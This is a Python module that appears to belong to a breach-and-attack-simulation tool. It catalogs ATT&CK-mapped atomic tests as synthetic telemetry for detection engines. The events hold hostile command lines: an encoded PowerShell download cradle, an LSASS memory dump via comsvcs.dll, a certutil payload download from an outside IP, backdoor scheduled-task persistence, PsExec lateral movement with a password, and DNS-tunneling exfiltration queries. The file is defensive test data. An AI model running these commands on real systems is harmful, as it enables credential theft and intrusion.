"""
Atomic Red Team / BAS Simulation Test Library.
Provides structured atomic tests with synthetic telemetry payloads mapped to MITRE ATT&CK.
"""

from typing import List, Optional
from cybershield.bas.schemas import AtomicTest


ATOMIC_TEST_CATALOG: List[AtomicTest] = [
    AtomicTest(
        test_id="BAS-T1059-001",
        name="PowerShell Encoded Script Execution",
        tactic="Execution",
        mitre_technique_id="T1059.001",
        description="Simulates adversary executing obfuscated Base64-encoded command via powershell.exe to evade basic string inspection.",
        category="Process Execution",
        severity="HIGH",
        expected_detection_engines=["EDR", "HUNTING"],
        simulated_events=[
            {
                "event_type": "PROCESS_CREATE",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -NoProfile -NonInteractive -enc SUVYIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
                "parent_process": "explorer.exe",
                "user_name": "sim_user",
            }
        ],
    ),
    AtomicTest(
        test_id="BAS-T1003-001",
        name="LSASS Memory Dumping via Comsvcs MiniDump",
        tactic="Credential Access",
        mitre_technique_id="T1003.001",
        description="Simulates adversary dumping LSASS memory to disk using the native comsvcs.dll DLL export.",
        category="Credential Harvesting",
        severity="CRITICAL",
        expected_detection_engines=["EDR", "HUNTING", "SIGMA"],
        simulated_events=[
            {
                "event_type": "PROCESS_CREATE",
                "process_name": "rundll32.exe",
                "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\sim_lsass.dmp full",
                "parent_process": "cmd.exe",
                "user_name": "SYSTEM",
            }
        ],
    ),
    AtomicTest(
        test_id="BAS-T1218-011",
        name="LOLBAS Certutil Remote Payload Download",
        tactic="Defense Evasion",
        mitre_technique_id="T1218",
        description="Simulates living-off-the-land file retrieval using certutil.exe with the -urlcache flag.",
        category="LOLBAS Evasion",
        severity="HIGH",
        expected_detection_engines=["EDR", "HUNTING"],
        simulated_events=[
            {
                "event_type": "PROCESS_CREATE",
                "process_name": "certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://185.220.101.5/simulated_beacon.bin C:\\temp\\beacon.bin",
                "parent_process": "cmd.exe",
                "user_name": "sim_user",
            }
        ],
    ),
    AtomicTest(
        test_id="BAS-T1048-003",
        name="DNS Tunneling High Entropy Label Simulation",
        tactic="Exfiltration",
        mitre_technique_id="T1048",
        description="Simulates exfiltration of encoded data disguised as high-entropy DNS subdomains.",
        category="Network Exfiltration",
        severity="HIGH",
        expected_detection_engines=["HUNTING", "DPI"],
        simulated_events=[
            {
                "event_type": "DNS_QUERY",
                "query": "7a9f02bc4d81ea199201fa882c9183ab94827104.tunnel.adversary-sim.org",
                "query_type": "TXT",
                "dns_query": "7a9f02bc4d81ea199201fa882c9183ab94827104.tunnel.adversary-sim.org",
                "src_ip": "10.0.1.77",
            }
        ],
    ),
    AtomicTest(
        test_id="BAS-T1110-001",
        name="Brute Force Password Guessing Sequence",
        tactic="Credential Access",
        mitre_technique_id="T1110.001",
        description="Simulates 4 failed login attempts followed immediately by a successful authentication attempt.",
        category="Authentication Abuse",
        severity="CRITICAL",
        expected_detection_engines=["CEP", "CORRELATION"],
        simulated_events=[
            {"event_type": "AUTH_FAILURE", "username": "sim_target_user", "src_ip": "198.51.100.99"},
            {"event_type": "AUTH_FAILURE", "username": "sim_target_user", "src_ip": "198.51.100.99"},
            {"event_type": "AUTH_FAILURE", "username": "sim_target_user", "src_ip": "198.51.100.99"},
            {"event_type": "AUTH_SUCCESS", "username": "sim_target_user", "src_ip": "198.51.100.99"},
        ],
    ),
    AtomicTest(
        test_id="BAS-T1486",
        name="Ransomware Bulk File Modification Spike",
        tactic="Impact",
        mitre_technique_id="T1486",
        description="Simulates a rapid burst of 22 file write/modification events on an endpoint.",
        category="Ransomware Behavior",
        severity="CRITICAL",
        expected_detection_engines=["CEP", "EDR"],
        simulated_events=[
            {"event_type": "FILE_MODIFIED", "host_id": "SIM-HOST-01", "path": f"C:\\Shares\\file_{i}.locked"}
            for i in range(22)
        ],
    ),
    AtomicTest(
        test_id="BAS-T1053-005",
        name="Scheduled Task Creation in Temp Directory",
        tactic="Persistence",
        mitre_technique_id="T1053.005",
        description="Simulates scheduled task persistence targeting a binary inside AppData\\Temp.",
        category="Persistence",
        severity="MEDIUM",
        expected_detection_engines=["HUNTING", "SIGMA"],
        simulated_events=[
            {
                "event_type": "PROCESS_CREATE",
                "process_name": "schtasks.exe",
                "command_line": "schtasks.exe /create /tn \"SimulatedUpdater\" /tr \"C:\\Users\\User\\AppData\\Temp\\backdoor.exe\" /sc daily",
                "parent_process": "cmd.exe",
                "user_name": "sim_user",
            }
        ],
    ),
    AtomicTest(
        test_id="BAS-T1021-002",
        name="Remote Process Invocation via PsExec Admin Share",
        tactic="Lateral Movement",
        mitre_technique_id="T1021",
        description="Simulates lateral movement using PsExec targeting remote administrative shares (ADMIN$).",
        category="Lateral Movement",
        severity="HIGH",
        expected_detection_engines=["HUNTING"],
        simulated_events=[
            {
                "event_type": "PROCESS_CREATE",
                "process_name": "psexec.exe",
                "command_line": "psexec.exe \\\\10.0.0.15 -u DOMAIN\\Admin -p Password123! cmd.exe /c whoami",
                "parent_process": "cmd.exe",
                "user_name": "Admin",
            }
        ],
    ),
]


def get_atomic_test(test_id: str) -> Optional[AtomicTest]:
    for t in ATOMIC_TEST_CATALOG:
        if t.test_id == test_id:
            return t
    return None
